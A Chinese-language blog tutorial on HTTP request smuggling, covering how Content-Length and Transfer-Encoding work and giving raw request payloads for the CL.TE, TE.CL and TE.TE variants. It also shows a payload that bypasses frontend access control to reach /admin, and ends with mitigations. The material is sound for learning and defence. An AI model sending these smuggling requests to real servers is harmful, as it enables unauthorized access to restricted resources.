---
title: HTTP Request Smuggling
date: 2021-05-22 15:46:41
tags:
- http
- security
categories:
- http security
---

# HTTP Request Smuggling

現今的Web應用程式架構通常由frontend server(load balancer)將http request轉給backend server，且front-end server與backend server間會使用persistent connection來減少反覆建立tcp開銷(3 way handshake、slow start)。HTTP smuggling透過frontend server與backend server對http body長度判斷依據不同，將干擾的資訊prepend在下個request達成攻擊。

![](https://i.imgur.com/oNHq051.png)

## HTTP1.x 判斷message body的方式

### Content-Length

當client與server用同一個tcp連線來傳送多個http request時，要如何知道http的結尾？透過Content-Length header來聲明message body的長度

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

### Transfer-Encoding

因為header必須要送到，因此當app要動態的產生message body而沒辦法預先知道message body長度時就沒辦法用Content-Length。Transfer-Encoding header聲明message body會透過將message切成多個chunks傳送，每個chunk的開頭是chunk size(十六進制表示)接著CRLF，再接著chunk content，收到chunk size 0時表示message body結束

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

## 如何執行HTTP smuggling

雖然rfc有規範當同時出現Content-Length與Transfer-Encoding時，應該要採用Transfer-Encoding，但現實世界卻不一定會是這樣，像是有些server不支援TE。而當request同時帶有CL與TE且frontend server與backend server對body邊界的認定不同時，就可能產生弱點

### CL.TE vulnerabilities

frontend server看CL，backend server看TE

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

frontend server因為看CL，所以會把整包轉給backend server，但backend server看TE，因此只讀到chunk size 0就認為這次request結束並回response，而剩下的message(`G`)，backend server會認為是下個http request而先buffer住直到剩下的header到

下個request就會像是以下範例，因不認得GPOST這個method而得到錯誤

```
GPOST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
```

### TE.CL vulnerabilities

frontend server看TE，backend server看CL

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

frontend server因為看TE，所以會把整包轉給backend server，但backend server看CL，因此只讀到第一行(5c跟CRLF共4個bytes)就認為這次request結束並回response，而剩下的message，backend server會認為是下個http request而先buffer住直到剩下的header到

下個request就會像是以下範例，因不認得GPOST這個method而得到錯誤

```
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
```

### TE.TE behavior: obfuscating the TE header

frontend server與backend server都支援處理TE，藉由帶入錯誤的TE來混淆，而frontend server與backend server對混淆的TE處理方式不同時，像是其中一個server被混淆而去看CL時，就形成上述的兩種情況之一

```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
```

## 用HTTP smuggling繞過frontend server的存取控制

這裡舉個比較真實的例子。有些應用程式會在frontend server做存取控制，像是限制只有有權限的使用者才能存取特定endpoint，frontend server只轉有權限的使用者的request給backend server，backend server則完全信任fronent server bypass後的request，因此backend server不做任何權限驗證

假設攻擊者只能存取`/home`而不能存取`/admin`，攻擊者藉由http smuggling方法，讓frontend server看到兩次存取`/home`的request，backend server看到一次`/home`與一次`/admin`的request，而第二次request繞過frontend server的限制存取受限的資源

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

## 如何避免http smuggling

* backend server不使用persistent connection，因此每個request都是不同的connection
* backend server使用http2，http2使用不同於http1.x的封包格式
* frontend server與backend server使用相同的方式來判定message body的長度

## Reference

* [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
* [Exploiting HTTP request smuggling vulnerabilities
](https://portswigger.net/web-security/request-smuggling/exploiting)
